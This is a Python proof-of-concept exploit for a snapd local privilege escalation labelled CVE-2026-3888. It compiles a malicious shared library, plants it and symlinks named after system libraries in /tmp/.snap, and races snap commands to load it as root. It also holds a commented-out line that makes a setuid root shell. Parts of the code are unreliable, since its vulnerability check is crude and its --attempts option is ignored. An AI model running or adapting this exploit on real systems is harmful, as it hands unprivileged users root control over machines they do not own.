#!/usr/bin/env python3
"""
PoC for CVE-2026-3888: Local Privilege Escalation in snapd
Author: AsaKin1337 || Sindikat777 999 SPBU KD8
Description: This script demonstrates a race condition vulnerability in snapd that
allows a local, unprivileged user to gain root privileges.

DISCLAIMER: For educational and authorized security testing purposes only.
"""

import os
import sys
import time
import subprocess
import shutil
import argparse
import stat
import tempfile
import threading

# --- Constants ---
SNAP_PRIVATE_TMP = "/tmp/.snap"
MALICIOUS_LIB_NAME = "libc.so.6"  # More realistic target library
MALICIOUS_LIB_PATH = os.path.join(SNAP_PRIVATE_TMP, MALICIOUS_LIB_NAME)

# Improved malicious library with proper error handling and better proof
MALICIOUS_LIB_C_CODE = """#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

__attribute__((constructor))
void init() {
    // Create proof file with root privileges
    FILE *fp = fopen("/tmp/.cve-2026-3888-proof", "w");
    if (fp) {
        fprintf(fp, "CVE-2026-3888 PWNED!\\n");
        fprintf(fp, "EUID: %d\\n", geteuid());
        fprintf(fp, "EGID: %d\\n", getegid());
        
        // Get current working directory
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            fprintf(fp, "CWD: %s\\n", cwd);
        }
        
        fclose(fp);
        
        // Make it readable by everyone
        chmod("/tmp/.cve-2026-3888-proof", 0644);
    }
    
    // Optional: Create a root shell (more dangerous)
    // system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
}
"""

def check_dependencies():
    """Check if required tools are available."""
    required_tools = ['gcc', 'snap']
    missing_tools = []
    
    for tool in required_tools:
        if not shutil.which(tool):
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
        print("[!] Please install: gcc and snapd")
        return False
    
    return True

def check_vulnerability():
    """
    Enhanced vulnerability check with more accurate detection.
    """
    print("[*] Checking system for vulnerability...")
    
    # Check snapd version for known vulnerable versions
    try:
        result = subprocess.run(["snap", "--version"], 
                               capture_output=True, text=True, check=True)
        snap_version = result.stdout.split('\n')[0]
        print(f"[+] snapd version: {snap_version}")
        
        # Parse version (simplified - you'd want proper version comparison)
        if "2." in snap_version:
            print("[*] This version might be vulnerable")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[-] Could not determine snapd version")
        return False
    
    # Check if snap private tmp exists and its permissions
    if os.path.exists(SNAP_PRIVATE_TMP):
        st = os.stat(SNAP_PRIVATE_TMP)
        print(f"[+] Found snap private tmp: {SNAP_PRIVATE_TMP}")
        print(f"[+] Permissions: {oct(st.st_mode)}")
        print(f"[+] Owner: {st.st_uid}:{st.st_gid}")
        
        # Check if we have write access in parent directory
        parent_dir = os.path.dirname(SNAP_PRIVATE_TMP)
        if os.access(parent_dir, os.W_OK):
            print(f"[+] We can write to {parent_dir}")
            return True
        else:
            print(f"[-] No write access to {parent_dir}")
            return False
    else:
        print(f"[+] Snap private tmp directory doesn't exist - good for exploitation")
        return True

def create_malicious_library():
    """
    Compiles the C code into a malicious shared library with better error handling.
    """
    print(f"[*] Creating malicious library...")
    
    # Create temporary directory for compilation
    temp_dir = tempfile.mkdtemp(prefix="snap_exploit_")
    c_file = os.path.join(temp_dir, "payload.c")
    so_file = os.path.join(temp_dir, MALICIOUS_LIB_NAME)
    
    try:
        # Write C code
        with open(c_file, "w") as f:
            f.write(MALICIOUS_LIB_C_CODE)
        
        # Compile with more robust options
        compile_cmd = [
            "gcc",
            "-shared",
            "-fPIC",
            "-Wall",  # Show warnings
            "-O2",    # Optimize
            "-o", so_file,
            c_file,
            "-ldl"    # Link with libdl
        ]
        
        print(f"[*] Compiling: {' '.join(compile_cmd)}")
        result = subprocess.run(compile_cmd, 
                               capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"[-] Compilation failed:")
            print(result.stderr)
            return None
        
        if not os.path.exists(so_file):
            print("[-] Compiled library not found")
            return None
        
        print(f"[+] Library compiled successfully")
        return so_file
        
    except Exception as e:
        print(f"[-] Error during compilation: {e}")
        return None

def race_condition_loop(lib_path):
    """
    Attempts to win the race condition by continuously recreating the directory
    and triggering snap execution.
    """
    print("[*] Starting race condition loop...")
    print("[*] Press Ctrl+C to stop")
    
    success = False
    attempts = 0
    
    try:
        while not success and attempts < 100:  # Limit attempts to avoid infinite loop
            attempts += 1
            print(f"\r[*] Attempt {attempts}/100", end="", flush=True)
            
            # Create the snap private tmp directory
            try:
                os.makedirs(SNAP_PRIVATE_TMP, exist_ok=True)
                
                # Copy our malicious library
                dest_path = os.path.join(SNAP_PRIVATE_TMP, MALICIOUS_LIB_NAME)
                shutil.copy2(lib_path, dest_path)
                
                # Set permissions to ensure it's readable
                os.chmod(dest_path, 0o755)
                
                # Also create some other common library names for good measure
                common_libs = ["libpthread.so.0", "libdl.so.2", "libc.so.6"]
                for lib in common_libs:
                    alt_path = os.path.join(SNAP_PRIVATE_TMP, lib)
                    if not os.path.exists(alt_path):
                        try:
                            os.symlink(MALICIOUS_LIB_NAME, alt_path)
                        except:
                            pass
                
                # Trigger snap execution
                trigger_snap_execution()
                
                # Check for success
                if os.path.exists("/tmp/.cve-2026-3888-proof"):
                    success = True
                    print("\n[+] SUCCESS! Race condition won!")
                    break
                    
            except Exception as e:
                pass
            
            # Small delay before next attempt
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    
    return success

def trigger_snap_execution():
    """
    Triggers snap execution to load our malicious library.
    """
    # Try multiple methods to trigger library loading
    
    # Method 1: Run a snap command
    snap_commands = [
        ["snap", "run", "--shell", "core"],
        ["snap", "run", "core"],
        ["snap", "list"],
        ["snap", "services"],
        ["snap", "changes"]
    ]
    
    for cmd in snap_commands:
        try:
            # Run in background to avoid blocking
            subprocess.Popen(cmd, 
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        except:
            pass

def check_success():
    """Check if the exploit succeeded."""
    proof_file = "/tmp/.cve-2026-3888-proof"
    
    if os.path.exists(proof_file):
        print("\n[+] EXPLOIT SUCCESSFUL!")
        print("[+] Proof file contents:")
        try:
            with open(proof_file, "r") as f:
                print(f.read())
            
            # Check if we got root
            with open(proof_file, "r") as f:
                content = f.read()
                if "EUID: 0" in content:
                    print("[+] GOT ROOT PRIVILEGES!")
                    return True
                else:
                    print("[!] Exploit worked but didn't get root")
                    return False
        except:
            print("[!] Could not read proof file")
            return False
    else:
        return False

def cleanup():
    """
    Thorough cleanup of all exploit artifacts.
    """
    print("\n[*] Cleaning up...")
    
    # Remove snap private tmp directory
    if os.path.exists(SNAP_PRIVATE_TMP):
        try:
            shutil.rmtree(SNAP_PRIVATE_TMP)
            print(f"[*] Removed {SNAP_PRIVATE_TMP}")
        except Exception as e:
            print(f"[-] Could not remove {SNAP_PRIVATE_TMP}: {e}")
    
    # Remove proof file
    proof_file = "/tmp/.cve-2026-3888-proof"
    if os.path.exists(proof_file):
        try:
            os.remove(proof_file)
            print(f"[*] Removed {proof_file}")
        except Exception as e:
            print(f"[-] Could not remove {proof_file}: {e}")
    
    # Remove any other created files
    temp_patterns = ["/tmp/payload*", "/tmp/snap_exploit_*"]
    for pattern in temp_patterns:
        try:
            subprocess.run(["rm", "-rf", pattern], 
                         stderr=subprocess.DEVNULL)
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2026-3888 (snapd LPE)")
    parser.add_argument("--cleanup", action="store_true", 
                       help="Clean up exploit artifacts")
    parser.add_argument("--force", action="store_true",
                       help="Force exploitation even if system doesn't appear vulnerable")
    parser.add_argument("--attempts", type=int, default=100,
                       help="Number of race condition attempts (default: 100)")
    args = parser.parse_args()

    if args.cleanup:
        cleanup()
        sys.exit(0)

    print("=" * 60)
    print("CVE-2026-3888 - snapd Local Privilege Escalation PoC")
    print("      AsaKin1337 || Sindikat777 999 SPBU KD8        ")
    print("=" * 60)
    print()

    # Check dependencies
    if not check_dependencies():
        sys.exit(1)

    # Check vulnerability
    vuln_status = check_vulnerability()
    if not vuln_status and not args.force:
        print("\n[-] System doesn't appear vulnerable")
        print("[!] Use --force to attempt exploitation anyway")
        sys.exit(1)
    
    if args.force:
        print("[!] Forcing exploitation attempt...")

    # Create malicious library
    lib_path = create_malicious_library()
    if not lib_path:
        print("[-] Failed to create malicious library")
        sys.exit(1)

    # Attempt race condition
    success = race_condition_loop(lib_path)
    
    if success and check_success():
        print("\n[+] EXPLOIT COMPLETED SUCCESSFULLY!")
        print("[!] Remember to run with --cleanup to remove artifacts")
    else:
        print("\n[-] Exploit failed after maximum attempts")
        print("[!] Try increasing attempts with --attempts or run with --force")
        
    # Offer cleanup
    response = input("\n[*] Clean up exploit artifacts? (y/n): ")
    if response.lower() == 'y':
        cleanup()

if __name__ == "__main__":
    main()
